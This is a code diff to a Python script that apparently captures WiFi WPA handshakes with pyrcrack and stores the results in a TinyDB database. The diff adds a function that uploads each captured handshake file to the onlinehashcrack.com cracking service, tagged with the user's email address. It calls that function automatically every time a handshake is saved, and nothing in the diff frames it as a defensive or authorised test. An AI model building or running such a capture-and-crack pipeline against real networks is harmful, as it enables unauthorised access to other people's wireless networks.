@@ -3,6 +3,7 @@
 import asyncio
 import pyrcrack
 import subprocess
+import requests
 from sys import argv
 from tinydb import TinyDB, Query
 from os import listdir
@@ -11,9 +12,13 @@ from os import listdir
 pdb = TinyDB('aps.json')
 ldb = {}
 IFACE="wlan2" if len(argv) < 2 else argv[1]
+EMAIL="" # Replace this with your own email address
 CHECKED=0
 
-def upload_file():    
+def upload_file(filepath):
+    with open(filepath, 'rb') as f:
+        r = requests.post('https://api.onlinehashcrack.com', files=dict(file=f), params=dict(email=EMAIL))
+        print(r.text, r.status_code)
     return
 
 async def check_pcap(cap_file, bssid):
@@ -23,6 +28,7 @@ async def check_pcap(cap_file, bssid):
         with open(cap_file, 'rb') as f:
             with open('handshakes/%s_handshake.cap' %bssid, 'ab+') as f2:
                 f2.write(f.read())
+                upload_file('handshakes/%s_handshake.cap' %bssid)
         return True
     return False
 
